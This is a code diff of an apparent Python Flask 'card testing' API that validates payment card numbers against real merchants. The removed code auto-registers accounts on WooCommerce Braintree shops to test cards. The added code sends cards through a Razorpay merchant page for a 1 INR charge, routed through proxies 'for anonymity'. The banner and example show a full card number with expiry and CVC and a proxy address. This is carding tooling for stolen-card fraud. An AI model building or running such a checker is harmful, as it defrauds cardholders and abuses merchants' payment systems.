-            async with self.session.post(
-                f"{self.base_url}{self.detected_config['payment_url']}",
-                headers=headers,
-                data=encoded
-            ) as response:
-                html = await response.text()
-                parsed = self.site_response(html)
-                
-                if 'approved' in parsed.lower() or 'success' in parsed.lower():
-                    return {'success': True, 'response': parsed}
-                else:
-                    return {'success': False, 'response': parsed}
-        except Exception as e:
-            return {'success': False, 'response': str(e)[:50]}
-    
-    async def check_cc(self, cc_data):
-        """Check credit card"""
-        try:
+            # Parse card data
             num, mm, yy, cvc = cc_data.split("|")
             
-            # Get payment nonces
-            add_payment_nonce, client_token, error = await self.get_payment_nonces()
-            if error:
-                return {'success': False, 'error': error}
-            if not add_payment_nonce or not client_token:
-                return {'success': False, 'error': 'Failed to get payment tokens'}
+            # Build Razorpay test URL
+            params = {
+                'cc': cc_data,
+                'url': 'https://razorpay.me/@ukinternational',
+                'amount': '100'
+            }
+            test_url = f"{RAZORPAY_TEST_ENDPOINT}?{urllib.parse.urlencode(params)}"
             
-            # Decode client token
-            auth = await self.decode_client_token(client_token)
-            if not auth:
-                return {'success': False, 'error': 'Failed to decode token'}
+            headers = self.base_headers.copy()
             
-            # Tokenize card
-            token_result = await self.tokenize_cc(auth, num, mm, yy, cvc, "10080")
-            if not token_result.get('success'):
-                return {'success': False, 'error': token_result.get('error')}
-            
-            # Add payment method
-            add_result = await self.add_payment_method(add_payment_nonce, token_result['token'])
-            return add_result
-            
+            async with self.session.get(test_url, headers=headers, allow_redirects=True) as response:
+                if response.status == 200:
+                    result = await response.json()
+                    
+                    # Extract the relevant fields
+                    message = result.get('message', 'Unknown error')
+                    status = result.get('status', 'unknown')
+                    
+                    return {
+                        'success': True,
+                        'code': status,
+                        'message': message
+                    }
+                else:
+                    return {
+                        'success': False,
+                        'error': f"Request failed with status {response.status}"
+                    }
+                    
         except Exception as e:
-            return {'success': False, 'error': str(e)[:50]}
-    
-    async def complete_workflow(self, cc_data):
-        """Complete workflow with auto-detection"""
-        try:
-            # Detect Braintree configuration
-            if not await self.detect_braintree_config():
-                return {'success': False, 'response': 'Braintree detection failed'}
-            
-            # Register account
-            user_data = generate_user_data()
-            success, result = await self.register_account(user_data)
-            if not success:
-                return {'success': False, 'response': f'Registration failed: {result}'}
-            
-            await asyncio.sleep(2)
-            await self.update_billing_address(user_data)
-            await asyncio.sleep(1)
-            
-            # Check card
-            cc_result = await self.check_cc(cc_data)
-            
-            if cc_result.get('success'):
-                return {'success': True, 'response': cc_result['response']}
-            else:
-                error_msg = cc_result.get('error') or cc_result.get('response', 'Unknown error')
-                return {'success': False, 'response': error_msg}
-                
-        except Exception as e:
-            return {'success': False, 'response': str(e)[:100]}
+            return {
+                'success': False,
+                'error': str(e)[:100]
+            }
 
 # ============================================================
 # ASYNC WRAPPER
 # ============================================================
 
-async def test_card_on_site(domain, cc):
-    """Test card on specific site with auto-detection"""
-    domain = extract_domain(domain)
-    
+async def test_razorpay_card(cc, proxy=None):
+    """Test card with Razorpay"""
     # Validate card
     is_valid, msg = validate_cc(cc)
     if not is_valid:
-        return {"status": "declined", "response": f"Invalid card: {msg}", "site": domain}
+        return {"code": "invalid_card", "message": f"Invalid card: {msg}"}
     
     try:
-        async with SmartBraintreeChecker(domain) as checker:
-            result = await checker.complete_workflow(cc)
+        async with RazorpayChecker(proxy) as checker:
+            result = await checker.test_card(cc)
             
             if result.get('success'):
-                return {"status": "approved", "response": result['response'], "site": domain}
+                return {
+                    "code": result['code'],
+                    "message": result['message']
+                }
             else:
-                return {"status": "declined", "response": result['response'], "site": domain}
+                error_msg = result.get('error', 'Unknown error')
+                return {
+                    "code": "test_failed", 
+                    "message": error_msg
+                }
     except Exception as e:
-        return {"status": "declined", "response": str(e)[:100], "site": domain}
+        return {
+            "code": "exception", 
+            "message": str(e)[:100]
+        }
 
 # ============================================================
 # FLASK ROUTES
@@ -1074,72 +201,86 @@ def home():
     """API Documentation"""
     return """
     <html>
-    <head><title>Auto Braintree API - Ultra-Robust Version</title></head>
+    <head><title>Razorpay 1 INR Card Testing API by kคli liຖนxx</title></head>
     <body style="font-family: Arial; padding: 40px; background: #1a1a2e; color: #eee;">
         <div style="max-width: 800px; margin: 0 auto; background: #16213e; padding: 30px; border-radius: 10px;">
-            <h1 style="color: #f39c12;">🚀 Auto Braintree Gateway API</h1>
-            <p style="color: #2ecc71; font-weight: bold;">✨ ULTRA-ROBUST - Handles ALL site configurations!</p>
-            <p style="color: #bbb;">Aggressively tries all approaches for any site</p>
+            <h1 style="color: #f39c12;">🚀 Razorpay Card Testing API</h1>
+            <p style="color: #2ecc71; font-weight: bold;">✨ Test cards against Razorpay payment gateway</p>
+            <p style="color: #bbb;">Simple endpoint for card testing with proxy support</p>
             
             <h2 style="color: #3498db;">API Endpoints:</h2>
             
             <div style="background: #0f3460; padding: 15px; margin: 15px 0; border-radius: 5px;">
-                <strong style="color: #2ecc71;">Multi-Site Test:</strong>
+                <strong style="color: #2ecc71;">Card Test:</strong>
                 <code style="display: block; background: #1a1a2e; padding: 10px; margin: 10px 0; border-radius: 3px; color: #f39c12;">
-                /gate=b3/cc=CARD
+                /gate=rz/cc=CARD?proxy=user:password@ip:port
                 </code>
             </div>
             
             <h2 style="color: #3498db;">Features:</h2>
             <ul style="color: #bbb;">
-                <li>✅ Auto-detects URL patterns (/my-account/ or /customer-account/)</li>
-                <li>✅ Auto-detects payment method (braintree_credit_card or braintree_cc)</li>
-                <li>✅ Works on ANY WooCommerce Braintree site</li>
-                <li>✅ Fast parallel testing</li>
-                <li>✅ Ultra-robust registration logic</li>
-                <li>✅ Handles different card types</li>
-                <li>✅ Comprehensive form field detection</li>
-                <li>✅ Multiple token sources</li>
-                <li>✅ Aggressive token detection</li>
-                <li>✅ Multiple registration approaches</li>
-                <li>✅ Checkout page fallback</li>
-                <li>✅ Login page fallback</li>
+                <li>✅ Card validation</li>
+                <li>✅ Proxy support</li>
+                <li>✅ Razorpay integration</li>
+                <li>✅ Clean JSON response</li>
+                <li>✅ Error handling</li>
             </ul>
             
-            <h2 style="color: #3498db;">Response:</h2>
+            <h2 style="color: #3498db;">Response Format:</h2>
             <code style="display: block; background: #1a1a2e; padding: 15px; border-radius: 5px; color: #2ecc71;">
 {<br>
-&nbsp;&nbsp;"status": "approved/declined",<br>
-&nbsp;&nbsp;"response": "Message",<br>
-&nbsp;&nbsp;"site": "domain.com"<br>
+&nbsp;&nbsp;"code": "status_code",<br>
+&nbsp;&nbsp;"message": "Detailed message"<br>
 }
             </code>
             
-            <p style="text-align: center; color: #888; margin-top: 30px;">Ultra-Robust v3.0</p>
+            <h2 style="color: #3498db;">Example:</h2>
+            <code style="display: block; background: #1a1a2e; padding: 10px; margin: 10px 0; border-radius: 3px; color: #f39c12;">
+GET /gate=rz/cc=5410719128567508|04|2027|846?proxy=user:password@209.174.185.196:6226<br>
+<br>
+Response:<br>
+{<br>
+&nbsp;&nbsp;"code": "card_not_enrolled",<br>
+&nbsp;&nbsp;"message": "3dsecure is not enabled for the card by the cardholder or the bank\/issuer"<br>
+}
+            </code>
+            
+            <p style="text-align: center; color: #888; margin-top: 30px;">Razorpay Testing API v1.0</p>
         </div>
     </body>
     </html>
     """
 
-@app.route('/gate=b3/cc=<path:cc>')
-def gateway_multi(cc):
-    """Test card on multiple default sites with auto-detection"""
+@app.route('/gate=rz/cc=<path:cc>')
+def gateway_razorpay(cc):
+    """Test card with Razorpay"""
+    # Extract proxy from query parameters
+    proxy_str = request.args.get('proxy', None)
+    proxy = None
+    
+    if proxy_str:
+        proxy = parse_proxy(proxy_str)
+        if not proxy:
+            return jsonify({
+                "code": "invalid_proxy", 
+                "message": "Proxy format should be user:password@ip:port"
+            }), 400
+    
     try:
-        results = []
-        for domain in DEFAULT_SITES:
-            try:
-                result = asyncio.run(test_card_on_site(domain, cc))
-                results.append(result)
-            except Exception as e:
-                results.append({"status": "declined", "response": str(e)[:100], "site": domain})
-        
-        return jsonify(results)
+        result = asyncio.run(test_razorpay_card(cc, proxy))
+        return jsonify(result)
     except Exception as e:
-        return jsonify([{"status": "declined", "response": str(e)[:100], "site": "All"}]), 500
+        return jsonify({
+            "code": "server_error", 
+            "message": str(e)[:100]
+        }), 500
 
 @app.errorhandler(404)
 def not_found(error):
-    return jsonify({"status": "declined", "response": "Endpoint not found", "site": "N/A"}), 404
+    return jsonify({
+        "code": "endpoint_not_found", 
+        "message": "Endpoint not found"
+    }), 404
 
 # ============================================================
 # RUN SERVER
@@ -1147,40 +288,40 @@ def not_found(error):
 
 if __name__ == "__main__":
     print("""
-╔════════════════════════════════════════════════════════════╗
-║   AUTO BRAINTREE API - ULTRA-ROBUST VERSION              ║
+╔════════════════════╗
+║   RAZORPAY 1 INR CARD TESTING API BY - kคli liຖนxx                        ║
 ╚════════════════════════════════════════════════════════════╝
 
 🚀 Server: http://localhost:8000/
 🔑 API Key: None (public access)
 
-✨ ULTRA-ROBUST FEATURES:
+✨ FEATURES:
 ──────────────────────────────
-✅ Automatically tries /my-account/ URLs
-✅ Automatically tries /customer-account/ URLs
-✅ Automatically tries /account/ URLs
-✅ Automatically detects payment method type
-✅ Works on ANY WooCommerce Braintree site!
-✅ Ultra-robust registration logic
-✅ Handles different card types
-✅ Comprehensive form field detection
-✅ Multiple token sources
-✅ Aggressive token detection
-✅ Multiple registration approaches
-✅ Checkout page fallback
-✅ Login page fallback
+✅ Card testing against Razorpay
+✅ Proxy support for anonymity
+✅ Clean JSON responses
+✅ Error handling
 
 ENDPOINTS:
 ──────────
-Multi Site:
-http://localhost:8000/gate=b3/cc=CARD
+Card Test:
+http://localhost:8000/gate=rz/cc=CARD?proxy=user:password@ip:port
 
 OUTPUT:
 ───────
 {
-  "status": "approved/declined",
-  "response": "Message",
-  "site": "domain.com"
+  "code": "status_code",
+  "message": "Detailed message"
+}
+
+EXAMPLE:
+───────
+http://localhost:8000/gate=rz/cc=5410719128567508|04|2027|846?proxy=user:password@209.174.185.196:6226
+
+RESPONSE:
+{
+  "code": "card_not_enrolled", 
+  "message": "3dsecure is not enabled for the card by the cardholder or the bank\/issuer"
 }
     """)
     
